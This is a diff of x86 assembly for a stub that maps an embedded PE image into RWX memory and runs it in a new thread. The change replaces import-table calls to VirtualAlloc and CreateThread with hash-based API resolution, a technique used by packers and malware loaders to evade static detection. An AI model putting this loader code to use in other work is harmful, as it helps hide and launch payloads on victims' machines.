@@ -13,19 +13,21 @@
 [BITS 32]
 [ORG 0]
 
-%include "../../IAT.asm"
-
 	call Stub				; ...
 PE:
 	incbin "Mem.map"		; PE file image
 	ImageSize: equ $-PE		; Size of the PE image
 Stub:
 	pop esi					; Get the address of image to esi
+	call IAT_API			;
+IAT_API:					;
+	pop ebp					; Get the address of hook_api to ebp
 	push dword 0x40 		; PAGE_EXECUTE_READ_WRITE
 	push dword 0x103000		; MEM_COMMI | MEM_TOP_DOWN | MEM_RESERVE
 	push dword ImageSize	; dwSize
 	push dword 0x00			; lpAddress
-	call [VA]				; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	push 0xE553A458			; hash( "kernel32.dll", "VirtualAlloc" )
+	call ebp				; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 
 	test eax,eax			; Check success 
 	jz OpEnd				; If VirtualAlloc fails don't bother :/	
@@ -55,7 +57,8 @@ CreateThread:
   	push ebx				; lpStartAddress
   	push eax				; dwStackSize
   	push eax				; lpThreadAttributes
-  	call [CT] 				; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
+  	push 0x160D6838 		; hash( "kernel32.dll", "CreateThread" )
+	call ebp				; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
   	jmp OpEnd				; <-
 GetAOE:
 	mov eax,[esi+0x3C]		; Get the offset of "PE" to eax
